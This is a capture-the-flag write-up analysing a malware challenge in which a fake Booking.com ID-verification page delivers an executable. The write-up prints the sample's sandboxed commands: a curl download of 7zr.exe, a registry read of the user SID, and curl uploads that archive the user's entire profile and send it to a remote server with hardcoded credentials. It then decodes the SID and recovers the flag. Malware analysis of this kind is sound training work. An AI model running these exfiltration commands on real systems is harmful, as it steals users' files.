## Chall description
```
Category: Malware
Oh jeeeez... I was on Booking.com trying to reserve my Hawaii vacation.
Once I tried verifying my ID, suddenly I got all these emails saying that my password was changed for a ton of different websites!! What is happening!?!
I had a flag.txt on my desktop, but that's probably not important...
Anyway, I still can't even finish booking my flight to Hawaii!! Here is the site I was on... can you get this thing to work!??!
```

## Chall procedure
Whe you open the website, a prompt form is displayed, after fill the form the `Booking - ID Verification.exe` file is downloaded from website. Let's emulate this with anyrun.

<img width="946" height="314" alt="Screenshot 2025-10-26 at 5 14 32 PM" src="https://github.com/user-attachments/assets/02a44c7e-47a4-4bb3-aa60-c092a39a0589" />

Let's check what happened after emulate the `exe` file into anyrun
<img width="1615" height="921" alt="Screenshot 2025-10-26 at 5 21 15 PM" src="https://github.com/user-attachments/assets/3e9aa20a-f433-465a-b94f-a72758fa7f96" />

The first interesting line, this download `7z.exe` and save it into `C:\Users\admin\AppData\Local\Temp\f25082c72a354d8d` folder.
```cmd
C:\WINDOWS\system32\cmd.exe /c curl -fL -sS --connect-timeout 30 -o "C:\Users\admin\AppData\Local\Temp\f25082c72a354d8d\a6480b1455468d15.exe" "https://7-zip.org/a/7zr.exe"
```

Then, it reads the user SID.Sid value and save into `.log` file. The key `ProfileList` contains subkeys for every user profile on the system, each named after that user’s Security Identifier (`SID`). The SID uniquely identifies a user or group in Windows. The value named Sid under that key contains the binary or string form of the same `SID`, confirming which account the profile belongs to.
```cmd
C:\WINDOWS\system32\cmd.exe /c powershell.exe -NoProfile -Command "(Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\S-1-5-21-1693682860-607145093-2874071422-1001').Sid > C:\Users\admin\AppData\Local\Temp\f25082c72a354d8d\DESKTOP-JGLLJLD_admin.log"
```
This is an example of the content in my local machine.
<img width="1243" height="498" alt="Screenshot 2025-10-26 at 5 51 40 PM" src="https://github.com/user-attachments/assets/03ce48e2-c5d9-4d64-8a5a-f5e3c5f5a5d0" />

Upload the `.log` file to their website using creds `prometheus:PA4tqS5NHFpkQwumsd3D92cb`
```cmd
C:\WINDOWS\system32\cmd.exe /c curl -sS --connect-timeout 30 -m 30 -o - -w HTTPSTATUS:%{http_code} -u "prometheus:PA4tqS5NHFpkQwumsd3D92cb" -F "file=@C:\Users\admin\AppData\Local\Temp\f25082c72a354d8d\DESKTOP-JGLLJLD_admin.log" "https://329c2d79.proxy.coursestack.com/a9GeV5t1FFrTqNXUN2vaq93mNKfSDqESBn2IlNiGRvh6xYUsQFEk4rRo8ajGA7fiEDe1ugdmAbCeqXw6y0870YkBqU1hrVTzgDIHZplop8WAWTiS3vQPOdNP" 2>&1
```
This is the `.log` file uploaded on remote server.
<img width="1053" height="643" alt="Screenshot 2025-10-26 at 5 25 41 PM" src="https://github.com/user-attachments/assets/c767a853-c574-4b45-b69f-1f6ccd978721" />

Read all the user content and create a `7z` file with a fake extension `mp3`, and save it into a temp folder.
```cmd
C:\WINDOWS\system32\cmd.exe /c cmd /c C:\Users\admin\AppData\Local\Temp\f25082c72a354d8d\a6480b1455468d15.exe a -p"S-1-5-21-1693682860-607145093-2874071422-1001" "C:\Users\admin\AppData\Local\Temp\f25082c72a354d8d\DESKTOP-JGLLJLD_admin.mp3" "C:\Users\\admin\\*" >nul 2>&1
```
After create the 7z file, it uploads the file again.
```cmd
C:\WINDOWS\system32\cmd.exe /c curl -sS --connect-timeout 30 -m 30 -o - -w HTTPSTATUS:%{http_code} -u "prometheus:PA4tqS5NHFpkQwumsd3D92cb" -F "file=@C:\Users\admin\AppData\Local\Temp\f25082c72a354d8d\DESKTOP-JGLLJLD_admin.mp3" "https://329c2d79.proxy.coursestack.com/a9GeV5t1FFrTqNXUN2vaq93mNKfSDqESBn2IlNiGRvh6xYUsQFEk4rRo8ajGA7fiEDe1ugdmAbCeqXw6y0870YkBqU1hrVTzgDIHZplop8WAWTiS3vQPOdNP" 2>&1
```

After visit the `url: https://329c2d79.proxy.coursestack.com/a9GeV5t1FFrTqNXUN2vaq93mNKfSDqESBn2IlNiGRvh6xYUsQFEk4rRo8ajGA7fiEDe1ugdmAbCeqXw6y0870YkBqU1hrVTzgDIHZplop8WAWTiS3vQPOdNP` and use the creds `prometheus:PA4tqS5NHFpkQwumsd3D92cb` we can see the following files, but this is for another machine, since it starts with `WINDOWS11` and the `.log` confirm that `1 5 0 0 0 0 0 5 21 0 0 0 18 239 154 226 242 155 126 245 147 116 180 120 244 1 0 0`.
<img width="1118" height="155" alt="Screenshot 2025-10-26 at 6 18 28 PM" src="https://github.com/user-attachments/assets/0ad4bb78-2c55-45c6-9e0e-8d743d1df4a4" />

This mean, we need to rebuild the `SID` value using `.log` file. This python script can help us with that
```python
sid=[1,5,0,0,0,0,0,5,21,0,0,0,18,239,154,226,242,155,126,245,147,116,180,120,244,1,0,0]
a=sid[0];c=sid[1];i=int.from_bytes(bytes(sid[2:8]),'big')
s=[int.from_bytes(bytes(sid[8+i:12+i]),'little')for i in range(0,4*c,4)]
print(f"S-{a}-{i}-"+'-'.join(map(str,s)))
```

```bash
## Output:
S-1-5-21-3801804562-4118715378-2025092243-500
```

```bash
7z e WINDOWS11-Administrator.zip

7-Zip [64] 17.05 : Copyright (c) 1999-2021 Igor Pavlov : 2017-08-28
p7zip Version 17.05 (locale=utf8,Utf16=on,HugeFiles=on,64 bits,12 CPUs x64)

Scanning the drive for archives:
1 file, 4765 bytes (5 KiB)

Extracting archive: WINDOWS11-Administrator.zip
--
Path = WINDOWS11-Administrator.zip
Type = zip
Physical Size = 4765

    
Enter password (will not be echoed):
                           
Would you like to replace the existing file:
  Path:     ./desktop.ini
  Size:     0 bytes
  Modified: 2025-10-04 21:50:30
with the file from archive:
  Path:     Pictures/desktop.ini
  Size:     0 bytes
  Modified: 2025-10-04 21:50:30
? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? A

Everything is Ok              

Folders: 15

tree .
.
├── Desktop
├── Documents
├── Downloads
├── Favorites
├── Links
├── Local
├── Microsoft
├── Microsoft Edge.lnk
├── Music
├── NTUSER.DAT
├── Network.lnk
├── Notepad.lnk
├── OneDrive
├── Pictures
├── Programs
├── Recycle Bin.lnk
├── Roaming
├── Saved Games
├── Searches
├── This PC.lnk
├── UsrClass.dat
├── Videos
├── WINDOWS11-Administrator.zip
├── desktop.ini
└── flag.txt

cat flag.txt 
flag{0a741a06d3b8227f75773e3195e1d641}
```


